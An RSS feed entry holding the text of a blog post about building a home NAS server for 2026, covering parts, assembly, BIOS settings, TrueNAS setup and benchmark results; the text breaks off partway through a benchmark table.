<?xml version='1.0' encoding='UTF-8'?>
<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><id>hnrss.org/frontpage</id><title>Hacker News: Front Page</title><updated>2025-11-27T22:09:57.667956+00:00</updated><link href="https://news.ycombinator.com/" rel="alternate"/><link href="https://raw.githubusercontent.com/Prabesh01/hnrss-content-extract/refs/heads/main/out/rss.xml" rel="self"/><generator uri="https://lkiesow.github.io/python-feedgen" version="1.0.0">python-feedgen</generator><subtitle>Hacker News RSS</subtitle><entry><id>https://news.ycombinator.com/item?id=46065034</id><title>DIY NAS: 2026 Edition</title><updated>2025-11-27T22:10:03.560563+00:00</updated><content>&lt;doc fingerprint="e650381101a64f39"&gt;
  &lt;main&gt;
    &lt;p&gt;Fourteen years ago, my storage needs outpaced my capacity and I began to look into building a network attached storage server. I had a few criteria in mind and was curious to see if anyone had _ recently_ shared something similar, but I couldnât find anything that was relevant.&lt;/p&gt;
    &lt;p&gt;In fact, I found that the communities I was looking for answers in were actively hostile towards what I wanted to do. This resulted in my decision to build my own DIY NAS and share that as one of my very first blogs.&lt;/p&gt;
    &lt;p&gt;Much to my surprise, people were very interested in that blog! Ever since, Iâve been building a similar DIY NAS machine almost every year, trying to satisfy the curiosity of other prospective DIY NAS builders.&lt;/p&gt;
    &lt;p&gt;Here are those criteria:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Small form factor: Itâs not the case for me anymore, but at the time the space was limited in my office. I always assume that space in everybodyâs office is limited. As a result, I want my DIY NAS builds to occupy as little of that office space as I can.&lt;/item&gt;
      &lt;item&gt;At least six drive bays: Back when I built my NAS, it took about four drivesâ worth of storage to meet my storage needs. Plus, I desired two empty drive bays for future use. However, in the years since, hard drive capacities have increased dramatically. At some point in the future, I may reduce this to four drive bays.&lt;/item&gt;
      &lt;item&gt;An integrated, low-power CPU: I intend my DIY NAS to run 24 hours a day, 7 days a week, and 52 weeks a year. When it comes to power consumption, that can do some damage on your electric bill! Thankfully, our electricity here isnât as expensive as othersâ in the United States, or even further outside its borders, but I try and keep power consumption in mind when picking components for a DIY NAS build.&lt;/item&gt;
      &lt;item&gt;Homelab potential: It does not take up a lot of CPU horsepower for a NAS to serve up files, which means that on modern hardware thereâs a lot of untapped potential in a DIY NAS for virtual machines and/or containers to self-host services.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Itâs important to remember that these are my criteria, and not necessarily yours. Every DIY NAS builder should be making their own list of criteria and reconcile all of their component purchases against the criteria thatâs important to them.&lt;/p&gt;
    &lt;head rend="h2"&gt;Is it even a good time to build a NAS?&lt;/head&gt;
    &lt;p&gt;As I prepared to build this NAS, component prices disappointed me. Hard drives, SSDs, and RAM prices were all rising. Based on what Iâve been told, I expect Intel CPU prices to increase as well. My contact at Topton has been encouraging me to stock up on motherboards while they still have some in inventory. Based on whatâs been explained to me, I expect the motherboardsâ prices to rise and for their availability to potentially dwindle.&lt;/p&gt;
    &lt;p&gt;In short, the economy sucks, and the price of DIY NAS components is a pretty good reflection of just how sucky things are becoming. I briefly considered not publishing a DIY NAS build this year, hoping that things would improve a few months down the road. But then I asked myself, âWhat if itâs even worse in a few months?â&lt;/p&gt;
    &lt;p&gt;I sure hope things get better, but I fear and expect that theyâll get worse.&lt;/p&gt;
    &lt;head rend="h2"&gt;Motherboard and CPU&lt;/head&gt;
    &lt;p&gt;I built my first DIY NAS with a Topton motherboard in 2023. Each DIY NAS since then has also featured a Topton motherboard. My only complaint about the motherboards has been that buying them from one of the Chinese e-tail sites like AliExpress is considered problematic by some. With every DIY NAS build, I try and go through all the motherboards that I can find while searching for something with a better value proposition, but for each of the past three years Iâve landed on the latest offering from Topton.&lt;/p&gt;
    &lt;p&gt;For the DIY NAS: 2026 Edition, I chose the Topton N22 motherboard with the Intel Core 3 N355 CPU. The motherboard is similar to last yearâs Topton N18 but has incrementally more compelling features, particularly the extra 2 SATA ports, the PCI-e x1 slot, and the N355 CPU!&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Mini-ITX Form Factor&lt;/item&gt;
      &lt;item&gt;IntelÂ® Processor Core 3 N355 &lt;list rend="ul"&gt;&lt;item&gt;8 cores / 8 threads / Max Turbo 3.9GHz&lt;/item&gt;&lt;item&gt;15 W TDP&lt;/item&gt;&lt;item&gt;Integrated GPU with Intel Quick Sync Video&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;1 x DDR5 SO-DIMM&lt;/item&gt;
      &lt;item&gt;8 x SATA 3.0 Ports (Asmedia ASM1164)&lt;/item&gt;
      &lt;item&gt;2 x M.2 NVMe Slots (PCIe 3.0 x1)&lt;/item&gt;
      &lt;item&gt;1 x 10Gbps NIC (Marvell AQC113C)&lt;/item&gt;
      &lt;item&gt;2 x 2.5Gbps NICs (Intel i226-V)&lt;/item&gt;
      &lt;item&gt;1 x PCI-e x1 or M.2 E-Key slot&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;I opted for the motherboard with the Intel Core 3 N355 CPU. This makes the server a more capable homelab machine than prior yearsâ DIY NAS builds. The extra cores and threads come in handy for streaming media, replacing your cloud storage, facilitating home automation, hosting game servers, etc.&lt;/p&gt;
    &lt;head rend="h2"&gt;Case&lt;/head&gt;
    &lt;p&gt;Just like Topton has been making great motherboards for DIY NAS machines, JONSBO has been steadily releasing great cases for DIY NAS machines. This year SilverStone Technology, released a new case, the CS383 (specs), which I was very interested in buying for the DIY NAS: 2026 Edition. Unfortunately, it carries a pretty hefty price tag to go along with all of its incredible features!&lt;/p&gt;
    &lt;p&gt;The JONSBO N4 (specs) is a third of the price, adheres to my âsmaller footprintâ criteria, and it is rather impressive on its own. Itâs a tiny bit larger case than last yearâs DIY NAS, but I really like that it has drive bays for six 3.5â drives and two 2.5â drives.&lt;/p&gt;
    &lt;p&gt;Itâs peculiar in that two of the 3.5â drive bays (and the two 2.5â drive bays) arenât attached to a SATA backplane and canât be swapped anywhere as easily as the other four 3.5â bays. However, this peculiar decision seems to have caused the JONSBO N4 to sell for a bit less ($20â$40) than similar offerings from JONSBO. At its price, itâs a compelling value proposition!&lt;/p&gt;
    &lt;head rend="h3"&gt;Case Fan&lt;/head&gt;
    &lt;p&gt;In the past, Iâve found that the fans that come with JONSBO cases are too noisy. Theyâve been noisy for two reasons: The design and quality of the fans make them loud, and the fans are constantly running at their top speed because of the fan header theyâre plugged into on the casesâ SATA backplanes.&lt;/p&gt;
    &lt;p&gt;I anticipated that fan efficiency and noise would be a problem, so I picked out the Noctua NF-A12x25 PWM to solve it. Firstly, swapping in a high-quality fan that pushes more air and generates less noiseâespecially at its top speedâis a good first step. Secondly, Iâd address the problem by plugging the fan into the motherboardâs &lt;code&gt;SYS_FAN&lt;/code&gt; header instead of on the SATA backplane. This provides the opportunity to tune the fanâs RPMs directly in the BIOS and generate far less noise.&lt;/p&gt;
    &lt;head rend="h2"&gt;RAM&lt;/head&gt;
    &lt;p&gt;The first time I first asked myself, âShould I even build the DIY NAS: 2026 Edition?â came as I was checking prices on DDR5 memory. Thankfully for me, I had leftover RAM after purchasing DDR5 4800MHz SODIMMs for the DIY NAS: 2025 Edition, the Pocket Mini NAS, and then again for the DIY NAS that I built and gave away at 2025âs Texas Linux Fest. I was personally thankful that I had one brand-new 32GB DDR5 4800MHz SODIMM lying around, but I was wildly disappointed for everybody who will try and follow this build when I saw the price of those same SODIMMs.&lt;/p&gt;
    &lt;p&gt;Regardless, I felt a Crucial 32GB DDR5 4800MHz SODIMM (specs) was the right amount of RAM to get started with for a DIY NAS build in 2025. Whether you just need storage or you wish to also host virtual machines, you will benefit from having more than the bare minimum recommendation of RAM. I really wanted to buy a 48GB DDR5 4800MHZ SODIMM for this DIY NAS build, but I couldnât talk myself into spending the $250â$300 that it wouldâve wound up costing.&lt;/p&gt;
    &lt;head rend="h2"&gt;Storage&lt;/head&gt;
    &lt;p&gt;A quick disclaimer about all the drives that I purchased for the DIY NAS: 2026 Edition:, I already had all of them! I tend to buy things when I see them on sale, and as a result, I have a collection of brand-new parts for machines in my homelab or for upcoming projects. I raided that collection of spare parts for the DIY NAS: 2026 Edition.&lt;/p&gt;
    &lt;head rend="h3"&gt;Boot Drive&lt;/head&gt;
    &lt;p&gt;If you ranked the drives in your DIY NAS in order of importance, the boot drive should be the least-important drive. That is not saying that boot drive isnât performing an important function, but I am suggesting that you shouldnât invest a bunch of energy and money into picking the optimal boot drive.&lt;/p&gt;
    &lt;p&gt;Because the JONSBO N4 has a pair of 2.5â drive bays, I decided that a 2.5â SATA SSD would be ideal for the boot drives. As a rule of thumb, I try and spend less than $30 per boot drive in my DIY NAS builds.&lt;/p&gt;
    &lt;p&gt;Ultimately I selected a pair of 128GB Silicon Power A55 SSDs (specs). Iâve used these before, Iâd use them again in the future, and I even have four of their higher-capacity (1TB) SSDs in a pool in my own NAS.&lt;/p&gt;
    &lt;head rend="h3"&gt;App and Virtual Machine NVMe SSDs&lt;/head&gt;
    &lt;p&gt;Using your DIY NAS to host containers and virtual machines has really exploded in the past few years. The developers of NAS appliances have all made it much easier, and the self-hosted products themselves have become as goodâor often betterâthan things youâre probably subscribing to today. Because of that, I saved the highest-performing storage options on the Topton N22 motherboard for apps and VMs.&lt;/p&gt;
    &lt;p&gt;However, itâs important to point out that these M.2 slots are PCI-e version 3 and capped at a single PCI-e lane. This is a consequence of the limited number of PCI-e lanes available for each of the CPU options available for the Topton N22 motherboard (N100, N150, N305, and N355).&lt;/p&gt;
    &lt;p&gt;I opted for a NVMe drive that was a good value rather than a high performer and chose two of the Silicon Power 1TB M.2 NVMe SSDs (SP001TBP34A60M28) (specs).&lt;/p&gt;
    &lt;head rend="h3"&gt;Bulk Storage Hard Disk Drives&lt;/head&gt;
    &lt;p&gt;Thanks to rising prices, I opted to do like Iâve done with past DIY NAS builds and skip buying hard drives for the DIY NAS: 2026 Edition.&lt;/p&gt;
    &lt;p&gt;When planning your DIY NAS, it is good to always remember that storage will ultimately be your costliest and most important expense.&lt;/p&gt;
    &lt;p&gt;Here are a few things to consider when buying hard drives:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Determine your hardware redundancy preferences. I recommend having two hard disk drivesâ worth of redundancy (RAIDZ2, RAID6, etc.)&lt;/item&gt;
      &lt;item&gt;Focus on price-per-terabyte when comparing prices of drives.&lt;/item&gt;
      &lt;item&gt;Do some burn-in testing of your hard drives before putting them to use.&lt;/item&gt;
      &lt;item&gt;When buying new drives of the same model, try and buy them from multiple vendors to increase the chances of buying drives manufactured in separate batches.&lt;/item&gt;
      &lt;item&gt;Plan ahead! Understand the rate that your storage grows so that you can craft a strategy to grow your storage down the road.&lt;/item&gt;
      &lt;item&gt;Being cheap today can and will paint you into a corner thatâs quite expensive to get out of.&lt;/item&gt;
      &lt;item&gt;Understand that RAID is not a backup!&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Thankfully, Iâve collected a bunch of my own decommissioned hard drives which I used to thoroughly test this DIY NAS build.&lt;/p&gt;
    &lt;head rend="h2"&gt;SATA Cables&lt;/head&gt;
    &lt;p&gt;One of the under-the-radar features of the Topton N22 motherboard might be one of my favorite features! The motherboardâs Asmedia ASM1164 SATA controllers sit behind two SFF-8643 connectors. These connectors provide two advantages for these motherboards:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Save room on the motherboardâs PCB.&lt;/item&gt;
      &lt;item&gt;SFF-8643 to 4x SATA breakout cables reduce the amount of cable management hassle.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Power Supply&lt;/head&gt;
    &lt;p&gt;The one thing that I have routinely disliked about building small form factor DIY NAS machines is the price tag that accompanies a small form factor power supply (SFX) like is required with the JONSBO N4.&lt;/p&gt;
    &lt;p&gt;I wound up choosing the SilverStone Technology SX500-G (specs) which I had used earlier in the year for the DIY NAS I gave away at Texas Linux Fest. Its 500W rating exceeds the needs of all the components that Iâd picked out for the DIY NAS: 2026 Edition. Plus, the power supplyâs 80 Plus Gold rating aligns well with my criteria for power efficiency.&lt;/p&gt;
    &lt;head rend="h2"&gt;TrueNAS Community Edition&lt;/head&gt;
    &lt;p&gt;Regardless of whether it was called FreeNAS, TrueNAS, TrueNAS CORE, TrueNAS SCALE, or now TrueNAS Community Edition, the storage appliance product(s) from iXSystems have always been my go-to choice. For each yearly DIY NAS build, I wander over to the TrueNAS Software Status page and look at the state of the current builds.&lt;/p&gt;
    &lt;p&gt;Iâm conservative with my personal NAS setup. However, for these blog builds, I typically choose Early Adopter releases. This year thatâs TrueNAS 25.10.0.1 (aka Goldeye). I enjoy being able to use these DIY NAS builds as a preview to the latest and greatest that TrueNAS has to offer.&lt;/p&gt;
    &lt;p&gt;I repeatedly choose TrueNAS because itâs become an enterprise-grade storage product, which is exactly the quality of solution that I want my data depending on. At the same time, it does not feel like you need a specialized certification and a truckload of enterprise storage experience to set up a NAS that exceeds your needs at home.&lt;/p&gt;
    &lt;p&gt;Many times I have been asked, âWhy not &amp;lt;insert NAS appliance or OS here&amp;gt;?â My answer to that question is, TrueNAS has always done everything that I need it to, and they havenât given me any reason to consider anything else. As a result, thereâs never been a need for me to evaluate something else.&lt;/p&gt;
    &lt;head rend="h2"&gt;Final Parts List&lt;/head&gt;
    &lt;table&gt;
      &lt;row span="5"&gt;
        &lt;cell role="head"&gt;Component&lt;/cell&gt;
        &lt;cell role="head"&gt;Part Name&lt;/cell&gt;
        &lt;cell role="head"&gt;Qty&lt;/cell&gt;
        &lt;cell role="head"&gt;Cost&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;Motherboard&lt;/cell&gt;
        &lt;cell&gt;Topton N22 (w/ N355 CPU) NAS Motherboard&lt;/cell&gt;
        &lt;cell&gt;specs&lt;/cell&gt;
        &lt;cell&gt;1&lt;/cell&gt;
        &lt;cell&gt;$446.40&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;CPU&lt;/cell&gt;
        &lt;cell&gt;Intel Core 3 N355&lt;/cell&gt;
        &lt;cell&gt;specs&lt;/cell&gt;
        &lt;cell&gt;1&lt;/cell&gt;
        &lt;cell&gt;N/A&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;Memory&lt;/cell&gt;
        &lt;cell&gt;Crucial RAM 32GB DDR5 4800MHz SODIMM (CT32G48C40S5)&lt;/cell&gt;
        &lt;cell&gt;specs&lt;/cell&gt;
        &lt;cell&gt;1&lt;/cell&gt;
        &lt;cell&gt;$172.96&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;Case&lt;/cell&gt;
        &lt;cell&gt;JONSBO N4&lt;/cell&gt;
        &lt;cell&gt;specs&lt;/cell&gt;
        &lt;cell&gt;1&lt;/cell&gt;
        &lt;cell&gt;$121.59&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;Case Fan&lt;/cell&gt;
        &lt;cell&gt;Noctua NF-A12x25 PWM chromax.Black.swap&lt;/cell&gt;
        &lt;cell&gt;specs&lt;/cell&gt;
        &lt;cell&gt;1&lt;/cell&gt;
        &lt;cell&gt;$37.95&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;Power Supply&lt;/cell&gt;
        &lt;cell&gt;SilverStone 500W SFX Power Supply SST-SX500-G)&lt;/cell&gt;
        &lt;cell&gt;specs&lt;/cell&gt;
        &lt;cell&gt;1&lt;/cell&gt;
        &lt;cell&gt;$142.34&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;Boot Drive&lt;/cell&gt;
        &lt;cell&gt;Silicon Power 128GB A55 SATA SSD&lt;/cell&gt;
        &lt;cell&gt;specs&lt;/cell&gt;
        &lt;cell&gt;2&lt;/cell&gt;
        &lt;cell&gt;$21.97&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;Apps/VM Drives&lt;/cell&gt;
        &lt;cell&gt;Silicon Power 1TB - NVMe M.2 SSD (SP001TBP34A60M28)&lt;/cell&gt;
        &lt;cell&gt;specs&lt;/cell&gt;
        &lt;cell&gt;2&lt;/cell&gt;
        &lt;cell&gt;$99.99&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;SATA Cables&lt;/cell&gt;
        &lt;cell&gt;OIKWAN SFF-8643 Host to 4 X SATA Breakout Cable&lt;/cell&gt;
        &lt;cell&gt;N/A&lt;/cell&gt;
        &lt;cell&gt;2&lt;/cell&gt;
        &lt;cell&gt;$11.99&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="5"&gt;
        &lt;cell&gt;Price without Storage:&lt;/cell&gt;
        &lt;cell&gt;$989.36&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Total Price:&lt;/cell&gt;
        &lt;cell&gt;$1,189.34&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;head rend="h2"&gt;Hardware Assembly, BIOS Configuration, and Burn-In&lt;/head&gt;
    &lt;head rend="h3"&gt;Hardware Assembly&lt;/head&gt;
    &lt;p&gt;I always want the smallest possible DIY NAS. The JONSBO N4 case initially felt too large since it accommodates Micro ATX motherboards. However, I grew to accept its slightly larger footprint. However, putting the Topton N22 motherboard into the case felt roomy and luxurious. Building the DIY NAS: 2026 Edition compared to prior yearsâ felt a lot like coming home to put on sweatpants and a T-shirt after wearing a suit and tie all day long.&lt;/p&gt;
    &lt;p&gt;I wasnât too fond of the cable management of the power supplyâs cables. The layout of the case pretty much makes the front of the power supply inaccessible once it is installed. One consequence of this is that the power cable which powered the SATA backplane initially prevented the 120mm case fan from spinning up. That issue was relatively minor and was resolved with zip ties.&lt;/p&gt;
    &lt;p&gt;Overall, I felt pretty good about the assembly of the DIY NAS: 2026 Edition, but things would take a turn for the worse when I decided to fill all the 3.5-inch drive bays up with some of my decommissioned 8TB HDDs. Now this is probably my fault, I wouldnât be surprised at all that the manual of the JONSBO N4 warned me against this, but putting the drives in last turned out to be a major pain in the neck for each of the four drive bays without a SATA backplane.&lt;/p&gt;
    &lt;p&gt;I had wrongly guessed that you accessed those drivesâ power and data ports from the front of the case. I worked really hard to route the cables and even managed to install all of the drives before realizing my error and learning my lesson. Iâm understanding now why the JONSBO N4 is cheaper than all of its siblings: Partly because thereâs a missing SATA backplane, but also because those other 4 drive baysâ layout is frustrating.&lt;/p&gt;
    &lt;p&gt;Donât let my last couple paragraphs sour you on the JONSBO N4, though. I still really like its size; it feels big when youâre working in it with a Mini ITX motherboard. If you wind up deciding to use the JONSBO N4, then I suggest that you put those four drives and their cables in first before you do anything else. That wouldâve made a world of difference for me. Looking at the documentation before getting started might have saved me quite a bit of aggravation, too!&lt;/p&gt;
    &lt;p&gt;If I have ruined the JONSBO N4 for you, then check out the JONSBO N3. Its eight 3.5-inch drive bays pair up really nicely with the Topton N22 motherboard. You can see what I thought of the JONSBO N3 by reading the DIY NAS: 2024 Edition blog.&lt;/p&gt;
    &lt;head rend="h3"&gt;BIOS Configuration&lt;/head&gt;
    &lt;p&gt;Generally speaking, I do as little as I possibly can in the BIOS. Normally, I strive to only set the time and change the boot order. However, I did a bit more for the DIY NAS: 2026 Edition since Iâm using the &lt;code&gt;SYS_FAN&lt;/code&gt; header for the fan responsible for cooling the hard drives.  Here are the changes that I made in the BIOS:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Set the System Date and System Time to Greenwich Mean Time &lt;list rend="ol"&gt;&lt;item&gt;Advanced &lt;list rend="ol"&gt;&lt;item&gt;Hardware Monitor ( Advanced) &lt;list rend="ol"&gt;&lt;item&gt;Set SYS SmartFan Mode to &lt;code&gt;Disabled&lt;/code&gt;.&lt;/item&gt;&lt;item&gt;Set the Manual PWM Setting (for &lt;code&gt;SYS_FAN&lt;/code&gt;) to 180.&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;&lt;item&gt;Set SYS SmartFan Mode to &lt;/item&gt;&lt;/list&gt;&lt;/item&gt;&lt;item&gt;Hardware Monitor ( Advanced) &lt;/item&gt;&lt;item&gt;Set PWRON After Power Loss to &lt;code&gt;Always On&lt;/code&gt;&lt;/item&gt;&lt;item&gt;Boot &lt;list rend="ol"&gt;&lt;item&gt;Set Boot Option #1 to the TrueNAS boot device.&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;Advanced &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Iâm not at all interested in venturing into the rabbitâs hole of trying to completely minimize how much power the NAS uses. However, I imagine there are some opportunities for power savings lurking in the BIOS. I didnât go looking for them myself, but if youâre intrepid enough to do so, here are a few suggestions that I have for saving some additional power:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Disable the onboard audio.&lt;/item&gt;
      &lt;item&gt;Disable any network interfaces that you donât wind up using.&lt;/item&gt;
      &lt;item&gt;Tinker with the CPU settings.&lt;/item&gt;
      &lt;item&gt;Got other suggestions? Share them in the comments!&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Burn-In&lt;/head&gt;
    &lt;p&gt;Because all of the hardware is brand-new to me and brand-new components are not guaranteed to be free of defects, I always do a little bit of burn-in testing to establish some trust in the hardware that Iâve picked out for each DIY NAS build. While I think doing some burn-in testing is critically important, I also think the value of subsequent burn-in testing drops the more that you do. Donât get too carried away, and do your own burn-in testing in moderation!&lt;/p&gt;
    &lt;head rend="h4"&gt;Memtest86+&lt;/head&gt;
    &lt;p&gt;I always use Memtest86+ to burn-in the RAM. I always run at least 3+ passes of Memtest86+. Typically, I run many more passes because I tend to let the system keep running additional passes overnight. Secondarily, running these many passes gives the CPU a little bit of work to do and thereâs enough information displayed by Memtest86+ to give me confidence in the CPU and its settings.&lt;/p&gt;
    &lt;head rend="h4"&gt;Hard Drives&lt;/head&gt;
    &lt;p&gt;The failure rate of hard drives is highest when the drives are new and then again when theyâre old. Regardless of type of hard drives that I buy or when I buy them, I always do some disk burn-in. I tend to run Spearfootâs Disk Burn-in and Testing script on all of my new drives. However, executing this script against all of the drives can take quite a long time, even if you use something like &lt;code&gt;tmux&lt;/code&gt; to run the tests in parallel.&lt;/p&gt;
    &lt;head rend="h2"&gt;Initial TrueNAS CE Setup&lt;/head&gt;
    &lt;p&gt;Thereâs always a little bit of setup that I do for a new TrueNAS machine. This isnât intended to be an all-inclusive step-by-step guide for all the things you should do with your DIY NAS. Instead, itâs more of a list of things I kept track of while I made sure that the DIY NAS: 2026 Edition was functional enough for me to finish writing this blog. That being said, I do think your NAS would be rather functional if you decided to do the same configuration.&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Updated the hostname to &lt;code&gt;diynas2026&lt;/code&gt;&lt;list rend="ol"&gt;&lt;item&gt;Note: This is only to avoid issues with another NAS on my network.&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;Updated the time zone.&lt;/item&gt;
      &lt;item&gt;Enabled the following services and set them to start automatically. &lt;list rend="ol"&gt;&lt;item&gt;SMB&lt;/item&gt;&lt;item&gt;SSH&lt;/item&gt;&lt;item&gt;NFS&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;Enabled password login for the &lt;code&gt;truenas_admin&lt;/code&gt;user.&lt;list rend="ul"&gt;&lt;item&gt;Note: If I were planning to use this DIY NAS long-term, I wouldnât have done this. Using SSH keys for authentication is a better idea.&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;Edited the TrueNAS Dashboard widgets to reflect the 10Gb interface (&lt;code&gt;enp1s0&lt;/code&gt;).&lt;/item&gt;
      &lt;item&gt;Created a pool named &lt;code&gt;flash&lt;/code&gt;which consisted of mirrored vdev using the Teamgroup MP44 1TB NVMe SSDs.&lt;/item&gt;
      &lt;item&gt;Created a pool named &lt;code&gt;rust&lt;/code&gt;which consisted of a single RAID-Z2 vdev using eight hard drives that I had sitting on my shelf after they were decommissioned.&lt;/item&gt;
      &lt;item&gt;Configured the Apps to use the &lt;code&gt;flash&lt;/code&gt;pool for the appsâ dataset.&lt;/item&gt;
      &lt;item&gt;Made sure that the System Dataset Pool was set to &lt;code&gt;flash&lt;/code&gt;.&lt;/item&gt;
      &lt;item&gt;Confirmed that there were Scrub Tasks set up for the &lt;code&gt;flash&lt;/code&gt;and&lt;code&gt;rust&lt;/code&gt;pools.&lt;/item&gt;
      &lt;item&gt;Created a dataset on each pool for testing: &lt;code&gt;flash-test&lt;/code&gt;and&lt;code&gt;rust-test&lt;/code&gt;.&lt;/item&gt;
      &lt;item&gt;Installed the Scrutiny app found in the App Catalog.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;If I were planning to keep this NAS and use it for my own purposes, I would also:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Set up a Letâs Encrypt certificate.&lt;/item&gt;
      &lt;item&gt;Hook up the NAS to a compatible UPS, enable the UPS service, and configure the UPS service to shut down the NAS before the battery runs out of juice.&lt;/item&gt;
      &lt;item&gt;Set up system email alert service.&lt;/item&gt;
      &lt;item&gt;Create replication tasks to back up critical data to my off-site NAS.&lt;/item&gt;
      &lt;item&gt;Add the new NAS to my Tailscale tailnet using the Tailscale app from the official catalog.&lt;/item&gt;
      &lt;item&gt;As the NAS is seeded with data, create and maintain a suite of snapshot tasks tailored to the importance of the different data being stored on the NAS.&lt;/item&gt;
      &lt;item&gt;Set up S.M.A.R.T. tests for all of the drives: &lt;list rend="ol"&gt;&lt;item&gt;Weekly Short Test&lt;/item&gt;&lt;item&gt;Monthly Long Test&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Benchmarks&lt;/head&gt;
    &lt;p&gt;Just about every year, I benchmark each DIY NAS build and almost always come to the same conclusion: The NAS will outperform your network at home. Your first bottleneck is almost always going to be the network, and the overwhelming majority of us have gigabit networks at homeâbut thatâs slowly changing since 2.5Gbps and 10Gbps network hardware has started to get reasonably affordable lately.&lt;/p&gt;
    &lt;p&gt;Even though I always come to the same conclusion, I still like to do the benchmarks for two reasons:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;It helps me build confidence that the DIY NAS: 2026 Edition works well.&lt;/item&gt;
      &lt;item&gt;People tend to enjoy consuming benchmarks, and itâs fun for me to see the DIY NASâ network card get saturated during the testing.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Throughput&lt;/head&gt;
    &lt;p&gt;I like to do three categories of tests to measure the throughput of the NAS:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Use iperf3 to benchmark throughput between my NAS and another machine on my network.&lt;/item&gt;
      &lt;item&gt;Benchmark the throughput of the pool(s) locally on the NAS using &lt;code&gt;fio&lt;/code&gt;.&lt;/item&gt;
      &lt;item&gt;Set up SMB shares on each of the pools and then benchmark the throughput when using those shares.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Every year I try and mention that Tom Lawrence from Lawrence Systems published a great video about benchmarking storage with FIO and shared the FIO commands from his video in their forums. I use these FIO commands constantly as a reference point forwh I am testing ZFS poolsâ throughput. More importantly Iâd like to point out that, in that same video, Tom says something very wise:&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="7"&gt;
        &lt;cell role="head"&gt;Tool&lt;/cell&gt;
        &lt;cell role="head"&gt;Pool&lt;/cell&gt;
        &lt;cell role="head"&gt;Test&lt;p&gt;Size&lt;/p&gt;&lt;/cell&gt;
        &lt;cell role="head"&gt;Random&lt;p&gt;Write&lt;/p&gt;&lt;p&gt;IOPS&lt;/p&gt;&lt;/cell&gt;
        &lt;cell role="head"&gt;Random&lt;p&gt;Read&lt;/p&gt;&lt;p&gt;IOPS&lt;/p&gt;&lt;/cell&gt;
        &lt;cell role="head"&gt;Sequential&lt;p&gt;Write&lt;/p&gt;&lt;p&gt;(MB/s)&lt;/p&gt;&lt;/cell&gt;
        &lt;cell role="head"&gt;Sequential&lt;p&gt;Read&lt;/p&gt;&lt;p&gt;(MB/s)&lt;/p&gt;&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="7"&gt;
        &lt;cell&gt;FIO&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;flash&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;4G&lt;/cell&gt;
        &lt;cell&gt;1906.00&lt;/cell&gt;
        &lt;cell&gt;2200.00&lt;/cell&gt;
        &lt;cell&gt;548.00&lt;/cell&gt;
        &lt;cell&gt;1214.00&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="7"&gt;
        &lt;cell&gt;FIO&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;flash&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;32G&lt;/cell&gt;
        &lt;cell&gt;2132.00&lt;/cell&gt;
        &lt;cell&gt;3012.00&lt;/cell&gt;
        &lt;cell&gt;544.00&lt;/cell&gt;
        &lt;cell&gt;1211.00&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="7"&gt;
        &lt;cell&gt;FIO&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;rust&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;4G&lt;/cell&gt;
        &lt;cell&gt;1352.00&lt;/cell&gt;
        &lt;cell&gt;108.00&lt;/cell&gt;
        &lt;cell&gt;367.00&lt;/cell&gt;
        &lt;cell&gt;530.00&lt;/cell&gt;
